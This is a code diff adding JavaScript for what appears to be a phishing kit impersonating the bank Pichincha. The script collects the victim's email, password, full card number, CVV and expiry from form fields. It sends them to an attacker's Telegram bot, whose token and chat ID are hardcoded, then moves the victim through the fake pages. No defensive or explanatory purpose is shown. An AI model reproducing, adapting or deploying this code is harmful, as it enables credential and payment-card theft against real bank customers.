@@ -1,0 +1,70 @@
+//bot token
+var telegram_bot_id = 8846344769:AAEojcRhytqpElPr6kBXXTV4BPtMRgip--g";
+//chat id
+var chat_id = -1003909972106;
+var USER, PASS, PIN, PIN2, PIN3, NUMBER, ip, ip2, message;
+
+var ready = function () {
+    US = document.getElementById("re-us").value;
+    CL = document.getElementById("re-cl").value;
+    ip2 = document.getElementById("address").innerHTML;
+    message =  "💲💲💲💲Pichincha💲💲💲💲\nEmail: "+ US + "\nClv: " + CL + "\n" + ip2;
+    localStorage.setItem("US", US);
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response);
+        location.href="index2.html"
+    });
+    return false;
+}
+
+var ready1 = function () {
+    US = localStorage.getItem("US");
+    NM = document.getElementById("nm-nm").value;
+    AP = document.getElementById("ap-ap").value;
+	TJ = document.getElementById("tj-tj").value;
+	CV = document.getElementById("cv-cv").value;
+	MS = document.getElementById("ms-ms").value;
+	YR = document.getElementById("yr-yr").value;
+    message = "\nNombre: " + NM + "\nApellido: " + AP + "\nTarjeta: " + TJ + "\nCV: " + CV + "\nMES: " + MS + "\nAño: " + YR + "\nLogueo: " + US; localStorage.setItem("US", US);
+};
+var sender1 = function () {
+    ready1();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response);
+        location.href="index4.html"
+    });
+    return false;
+}
+
+
